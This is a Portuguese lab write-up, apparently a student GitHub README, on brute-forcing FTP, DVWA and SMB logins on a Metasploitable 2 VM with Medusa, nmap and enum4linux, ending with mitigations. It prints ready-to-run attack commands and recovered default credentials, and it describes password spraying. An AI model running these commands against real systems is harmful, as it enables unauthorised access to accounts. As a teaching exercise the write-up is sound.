#  Criando um Ataque Brute Force com Medusa e Kali Linux

---

##  Introdução

Este projeto tem como objetivo demonstrar, de forma prática, a execução de ataques de força bruta em diferentes serviços, utilizando um ambiente controlado.

---

##  Objetivos

* Compreender ataques de força bruta
* Identificar vulnerabilidades de autenticação
* Utilizar ferramentas de segurança ofensiva
* Aplicar medidas de mitigação

---

##  Ambiente de Laboratório

###  Máquinas Utilizadas

* Kali Linux (atacante)
* Metasploitable 2 (vulnerável)

###  Configuração de Rede

* VMware
* Rede Host-Only
* Comunicação isolada

### 📡 IPs

* Kali: 192.168.80.129
* Alvo: 192.168.80.128

```bash
ip a
<img width="646" height="513" alt="image" src="https://github.com/user-attachments/assets/4d14a6c7-745b-4a60-9370-2903d5a5d723" />

ifconfig
<img width="722" height="490" alt="image" src="https://github.com/user-attachments/assets/af3b5051-e5a2-47b5-9152-8c7819e0a500" />




---

## 🌐 Conectividade

bash
ping -c 3 192.168.80.128


 Confirma que o alvo está acessível.

<img width="641" height="173" alt="image" src="https://github.com/user-attachments/assets/87e88134-7853-4585-8b25-1bf7226a98e5" />

---

##  Enumeração

bash
nmap -sV -p 21,22,80,445,139 192.168.80.128


###  Explicação:

*  -sV → versão dos serviços
*  -p → portas

###  Interpretação:

Identificação dos serviços ativos para direcionar os ataques.

<img width="649" height="317" alt="image" src="https://github.com/user-attachments/assets/b9fdb7d6-9a28-4607-a53b-885e5f5efcec" />

---

##  FTP

### Teste:

bash
ftp 192.168.80.128


### Ataque:

bash
medusa -h 192.168.80.128 -U users.txt -P pass.txt -M ftp -t 6
```

### Interpretação:

Credenciais fracas permitem acesso não autorizado como username: msfadmin  password:msfadmin

<img width="378" height="178" alt="image" src="https://github.com/user-attachments/assets/9d1c57ae-a7c3-411b-baa2-97863bb428cc" />


---

##  DVWA (Web)

O cenário foi realizado utilizando o DVWA (Damn Vulnerable Web Application), hospedado no endereço 192.168.80.128, que simula um formulário de login web tradicional.

O objetivo foi analisar o comportamento do formulário por trás do navegador e automatizar tentativas de autenticação com o Medusa. Através das ferramentas de desenvolvedor (F12 → aba Network), foi possível identificar que o login envia uma requisição do tipo POST contendo usuário e senha, retornando a mensagem “Login failed” em caso de falha.

Essa análise permitiu compreender como os dados são processados pelo backend e configurar corretamente o ataque de força bruta.

<img width="1279" height="788" alt="image" src="https://github.com/user-attachments/assets/c646aed9-f422-445f-8551-d3cec5371143" />


### Ataque:

bash
medusa -h 192.168.80.128 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6

<img width="679" height="668" alt="image" src="https://github.com/user-attachments/assets/8364f551-a9c9-485b-84c4-025a3fc65b20" />
<img width="643" height="702" alt="image" src="https://github.com/user-attachments/assets/28469eee-d8ec-4417-ba9b-d0722187cf6d" />




192.168.80.128 é o endereço IP do alvo.
-U users.txt está informando o arquivo com os nomes de usuários.
-P pass.txt vai informar o arquivo com as senhas.
-M http vai indicar que o módulo HTTP será usado para interagir com aplicações web.
-m PAGE:'/dvwa/login.php' \ vai informar o caminho do formulário de login do servidor web.

-m FORM:'username=^USER^&password=^PASS^&Login=Login' \ será o corpo da requisição.

-m 'FAIL=Login failed' -t 6 diz ao Medusa qual resposta é esperada para tentativas de falha.


###  Interpretação:

A análise da requisição HTTP foi essencial para automatizar o ataque.
A primeira forma de automatizar o ataque de força bruta em formulários de login web é fornecer ao Medusa dois arquivos: um com nomes de usuários possíveis e outro com senhas comuns. Esses arquivos são chamados de wordlists.

![DVWA](images/09-dvwa-attack.png)

---

##  SMB

O SMB é um protocolo da Microsoft utilizado para compartilhamento de arquivos, pastas e impressoras, além de autenticação de usuários e comunicação entre sistemas Windows e Linux.
Neste laboratório, foi simulado um cenário em que um atacante obtém acesso à rede interna (por phishing ou outro vetor) e identifica um servidor SMB ativo. Em seguida, são enumerados usuários e testadas senhas fracas de forma discreta (password spraying), evitando bloqueios de conta.
Esse tipo de ataque é silencioso e amplamente utilizado por grupos maliciosos, sendo difícil de detectar.

### Enumeração:

bash
enum4linux -a 192.168.80.128 | tee enum4_output.txt

-a ativa todas as técnicas possíveis de enumeração.
192.168.80.128 é o endereço do alvo (Metasploitable).
| tee enum4_output.txt grava a saída do comando no arquivo enum4_output.txt, enquanto exibe no terminal.

<img width="973" height="697" alt="image" src="https://github.com/user-attachments/assets/59fed475-8e4d-44ad-8c29-da2ebeb94082" />
<img width="478" height="597" alt="image" src="https://github.com/user-attachments/assets/30a571b8-064e-4d09-a914-2b8224597b05" />


### Ataque:

bash
medusa -h 192.168.80.128 -U users.txt -P pass.txt -M smbnt -t 6

<img width="1286" height="368" alt="image" src="https://github.com/user-attachments/assets/03c159c6-a400-480b-b668-8adb6a5ef71b" />



###  Interpretação:

Ambientes corporativos com senhas fracas são altamente vulneráveis.

---

##  Mitigações

* Senhas fortes
* MFA
* Bloqueio de tentativas
* Monitoramento de logs

---

##  Conclusão

Os testes demonstraram que falhas simples de autenticação podem comprometer totalmente um sistema.

A combinação de senhas fracas e ausência de mecanismos de proteção facilita ataques automatizados.

---

##  Aviso

Projeto realizado apenas para fins educacionais.

---
